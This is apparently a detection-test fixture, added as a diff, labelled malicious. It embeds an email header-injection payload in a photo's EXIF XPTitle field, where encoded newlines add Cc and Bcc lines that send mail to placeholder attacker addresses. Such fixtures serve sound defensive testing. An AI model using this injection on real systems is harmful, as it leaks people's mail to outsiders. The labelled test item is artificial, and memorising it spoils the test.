@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::93::binary-variations::0",
+  "base_sample_id": "exp::email-webfetch::93",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -802729991,
+  "content": "{\n  \"format\": \"image\",\n  \"metadata\": {\n    \"XPTitle\": \"To: victim@target.example.com%0ACc:spy@evil.example.com%0ABcc:spy2@evil.example.com\\n\",\n    \"Make\": \"Canon\",\n    \"Model\": \"EOS R5\",\n    \"DateTime\": \"2026:01:15 10:30:00\",\n    \"ExifVersion\": \"0232\"\n  }\n}",
+  "content_hash": "bb2118649049978ce2bbd00284a36cf95e4954610887ef2f18c212732a101835",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:exif",
+  "difficulty": "advanced"
+}
